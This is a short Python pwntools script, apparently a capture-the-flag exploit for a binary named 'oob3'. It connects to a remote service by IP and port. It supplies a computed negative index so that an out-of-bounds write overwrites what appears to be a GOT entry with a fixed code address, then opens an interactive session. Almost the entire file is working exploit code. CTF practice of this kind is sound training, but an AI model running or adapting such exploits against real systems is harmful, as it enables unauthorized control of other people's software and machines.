#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./oob3"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 3113)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    '''

    # gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'
rbp = p64(0x12334)
#main = p64(0x04006f7)

def write():
    c.sendlineafter('ID:', str((0x601018 - 0x06010c0) // 8))
    c.sendlineafter('Nickname:', p64(0x400928))
    c.sendlineafter('PIN: ', '1')
    #c.recvuntil('[')

write()





c.interactive()
c.close()
